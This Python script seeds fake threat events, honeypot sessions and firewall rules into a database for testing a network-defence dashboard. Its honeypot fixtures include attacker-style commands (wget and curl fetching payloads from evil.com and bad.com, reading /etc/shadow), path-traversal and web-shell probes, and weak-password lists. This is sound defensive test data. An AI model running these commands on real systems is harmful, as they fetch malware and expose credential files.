"""
Generate realistic test threat data for NTTH dashboard testing.
Run inside the backend container:
  docker exec ntth_backend python3 -m generate_test_data
Or from host:
  docker exec ntth_backend python3 /app/generate_test_data.py
"""
import asyncio
import uuid
import random
from datetime import datetime, timedelta

async def main():
    from app.database.session import AsyncSessionLocal, init_db
    from app.database.models import ThreatEvent, HoneypotSession, FirewallRule, Device

    await init_db()

    async with AsyncSessionLocal() as db:
        now = datetime.utcnow()

        # ── Attacker IPs (mix of internal + external) ──────────────────────
        attackers = [
            {"ip": "10.142.204.88",  "country": "India",    "city": "Bangalore",  "org": "Local LAN",      "origin": "internal"},
            {"ip": "10.142.204.55",  "country": "India",    "city": "Mumbai",     "org": "Local LAN",      "origin": "internal"},
            {"ip": "192.168.1.105",  "country": None,       "city": None,         "org": "Local Network",  "origin": "internal"},
            {"ip": "45.33.32.156",   "country": "USA",      "city": "Fremont",    "org": "Linode LLC",     "origin": "cloud"},
            {"ip": "185.220.101.42", "country": "Germany",  "city": "Frankfurt",  "org": "Tor Exit Node",  "origin": "tor"},
            {"ip": "103.203.57.12",  "country": "China",    "city": "Beijing",    "org": "Alibaba Cloud",  "origin": "cloud"},
            {"ip": "91.240.118.222", "country": "Russia",   "city": "Moscow",     "org": "DigitalOcean",   "origin": "vps"},
        ]

        threat_types = [
            {"type": "port_scan",    "risk_range": (0.65, 0.95), "action": "honeypot"},
            {"type": "brute_force",  "risk_range": (0.70, 0.99), "action": "block"},
            {"type": "syn_flood",    "risk_range": (0.80, 1.00), "action": "block"},
            {"type": "suspicious",   "risk_range": (0.25, 0.55), "action": "rate_limit"},
            {"type": "port_scan",    "risk_range": (0.50, 0.75), "action": "honeypot"},
            {"type": "brute_force",  "risk_range": (0.85, 0.99), "action": "block"},
        ]

        protocols = ["tcp", "udp", "tcp", "tcp", "tcp"]
        dst_ports = [22, 80, 443, 8080, 3389, 5900, 8888, 3306, 5432, 21, 23, 25, 110]

        # ── Generate 30 threat events over the past 2 hours ────────────────
        print("Generating 30 threat events...")
        for i in range(30):
            attacker = random.choice(attackers)
            threat = random.choice(threat_types)
            risk = round(random.uniform(*threat["risk_range"]), 4)
            minutes_ago = random.randint(1, 120)
            detected = now - timedelta(minutes=minutes_ago)

            # Determine action based on risk
            if risk >= 0.85:
                action = "block"
            elif risk >= 0.5:
                action = "honeypot"
            elif risk >= 0.3:
                action = "rate_limit"
            else:
                action = "log"

            incident_notes = (
                f'{{"source_tag": "attacker::{attacker["ip"].replace(".", "-")}", '
                f'"victim_ip": "10.142.204.241", '
                f'"network_origin": "{attacker["origin"]}", '
                f'"location_summary": "Approximate: {attacker.get("city", "Unknown")}, {attacker.get("country", "Unknown")}", '
                f'"response_mode": "redirect_and_hide_target", '
                f'"honeypot_port": 30022}}'
            )

            event = ThreatEvent(
                id=str(uuid.uuid4()),
                src_ip=attacker["ip"],
                dst_ip="10.142.204.241",
                dst_port=random.choice(dst_ports),
                protocol=random.choice(protocols),
                threat_type=threat["type"],
                risk_score=risk,
                rule_score=round(random.uniform(0.3, 1.0), 4),
                ml_score=round(random.uniform(0.1, 0.6), 4),
                action_taken=action,
                country=attacker.get("country"),
                city=attacker.get("city"),
                asn=attacker.get("org"),
                org=attacker.get("org"),
                latitude=round(random.uniform(-40, 60), 4) if attacker.get("country") else None,
                longitude=round(random.uniform(-120, 140), 4) if attacker.get("country") else None,
                detected_at=detected,
                acknowledged=False,
                notes=incident_notes,
            )
            db.add(event)

        # ── Generate 15 honeypot sessions ──────────────────────────────────
        print("Generating 15 honeypot sessions...")
        ssh_commands = [
            ["whoami", "cat /etc/passwd", "uname -a", "ls -la", "wget http://evil.com/malware.sh"],
            ["id", "cat /etc/shadow", "history", "ps aux"],
            ["ls", "cd /tmp", "curl http://bad.com/bot", "chmod +x bot"],
            ["pwd", "ifconfig", "netstat -an", "cat /proc/cpuinfo"],
            ["w", "last", "cat /var/log/auth.log"],
        ]
        http_paths = [
            [{"method": "GET", "path": "/admin", "body": ""}],
            [{"method": "GET", "path": "/wp-login.php", "body": ""}, {"method": "POST", "path": "/wp-login.php", "body": "user=admin&pass=test"}],
            [{"method": "GET", "path": "/.env", "body": ""}],
            [{"method": "GET", "path": "/phpmyadmin", "body": ""}],
            [{"method": "GET", "path": "/../../etc/passwd", "body": ""}],
            [{"method": "GET", "path": "/shell", "body": ""}, {"method": "POST", "path": "/shell", "body": "cmd=id"}],
            [{"method": "GET", "path": "/api/v1/config", "body": ""}],
        ]
        usernames = ["root", "admin", "test", "ubuntu", "pi", "user", "oracle", "postgres", "mysql"]
        passwords = ["123456", "password", "admin", "root", "toor", "12345678", "qwerty", "letmein"]

        import json
        for i in range(15):
            attacker = random.choice(attackers)
            is_ssh = random.random() > 0.4
            minutes_ago = random.randint(2, 90)
            started = now - timedelta(minutes=minutes_ago)
            duration = round(random.uniform(5.0, 600.0), 1)
            ended = started + timedelta(seconds=duration) if random.random() > 0.3 else None

            session = HoneypotSession(
                id=str(uuid.uuid4()),
                session_id=f"{'SSH' if is_ssh else 'HTTP'}-{uuid.uuid4().hex[:12]}",
                attacker_ip=attacker["ip"],
                observed_attacker_ip=attacker["ip"],
                attacker_port=random.randint(40000, 65535),
                victim_ip="10.142.204.241",
                victim_port=22 if is_ssh else 8888,
                honeypot_type="ssh" if is_ssh else "http",
                username_tried=random.choice(usernames) if is_ssh else None,
                password_tried=random.choice(passwords) if is_ssh else None,
                commands_run=json.dumps(random.choice(ssh_commands) if is_ssh else random.choice(http_paths)),
                duration_seconds=duration if ended else None,
                source_masked=False,
                country=attacker.get("country"),
                city=attacker.get("city"),
                asn=attacker.get("org"),
                org=attacker.get("org"),
                latitude=round(random.uniform(-40, 60), 4) if attacker.get("country") else None,
                longitude=round(random.uniform(-120, 140), 4) if attacker.get("country") else None,
                started_at=started,
                ended_at=ended,
            )
            db.add(session)

        # ── Generate 8 firewall rules (mix of active and expired) ──────────
        print("Generating 8 firewall rules...")
        for i in range(8):
            attacker = random.choice(attackers)
            rule_type = random.choice(["block", "redirect", "rate_limit", "block"])
            minutes_ago = random.randint(5, 100)
            created = now - timedelta(minutes=minutes_ago)
            is_active = random.random() > 0.3
            expires = created + timedelta(hours=1) if random.random() > 0.4 else None

            reasons = [
                "Automatic responder blocked a high-risk source after port scan detection.",
                "Automatic responder diverted a hostile source to the honeypot.",
                "Automatic responder throttled a suspicious source after multiple SYN probes.",
                "Brute force attack detected — source quarantined.",
                "SSH brute force from cloud VPS — redirected to Cowrie honeypot.",
                "Aggressive port scanning from Tor exit node — blocked.",
                "Multiple failed login attempts — rate limited.",
                "HTTP path traversal attempt — source blocked.",
            ]

            rule = FirewallRule(
                id=str(uuid.uuid4()),
                rule_type=rule_type,
                target_ip=attacker["ip"],
                target_port=30022 if rule_type == "redirect" else None,
                match_dst_ip="10.142.204.241" if rule_type == "redirect" else None,
                match_dst_port=22 if rule_type == "redirect" else None,
                protocol="tcp",
                nft_handle=f"handle-{random.randint(1000,9999)}",
                is_active=is_active,
                created_by="system",
                expires_at=expires,
                created_at=created,
                removed_at=None if is_active else created + timedelta(minutes=random.randint(10, 50)),
                reason=random.choice(reasons),
            )
            db.add(rule)

        await db.commit()
        print("✅ Test data generated successfully!")
        print("   30 threat events")
        print("   15 honeypot sessions")
        print("   8 firewall rules")
        print("   Refresh your dashboard to see the data!")


if __name__ == "__main__":
    asyncio.run(main())
